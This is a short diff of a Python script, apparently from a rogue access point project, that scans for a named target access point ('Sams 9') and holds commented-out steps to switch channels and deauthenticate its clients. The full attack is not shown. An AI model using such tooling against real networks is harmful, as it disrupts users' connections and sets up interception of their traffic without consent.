@@ -12,33 +12,32 @@
 
 # Let clients connect to our rogue AP
 
-import random
-from scapy.all import Dot11Beacon, Dot11, Dot11Elt, sniff
-from threading import Thread
-import os
-import time
-import pandas
+from scanner import Scanner
 
-from get_ap import get_ap
-from deauth import deauth_clients
-# from get_clients_on_ap
+INTERFACE = "wlan0"
+TIMEOUT = 5
 
+AP_TO_ATTACK = "Sams 9"
 
-INTERFACE = "wlan0mon"
-TIMEOUT = 10
+with Scanner(INTERFACE) as scanner:
+    AP_info = scanner.get_ap(timeout=TIMEOUT)
+    print(AP_info)
+    print(scanner.wifis)
 
-AP_info = get_ap(timeout=TIMEOUT, interface=INTERFACE, specific_ap="Sams 9")
+# set_interface_to_monitor_mode(INTERFACE)
 
-print(AP_info)
+# AP_info = get_ap(timeout=TIMEOUT, interface=INTERFACE)#, specific_ap=AP_TO_ATTACK)
 
-channel = AP_info.Channel[0]
-BSSID = AP_info.index[0]
+# print(AP_info)
 
-print(AP_info.Channel)
-print(BSSID[0])
-# change channel to be on APs channel
-os.system(f"iwconfig {INTERFACE} channel {channel}")
-# clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)
+# channel = AP_info.Channel[0]
+# BSSID = AP_info.index[0]
+
+# print(AP_info.Channel)
+# print(BSSID[0])
+# # change channel to be on APs channel
+# os.system(f"iwconfig {INTERFACE} channel {channel}")
+# # clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)
 
 # # Deauth clients
 # while True:
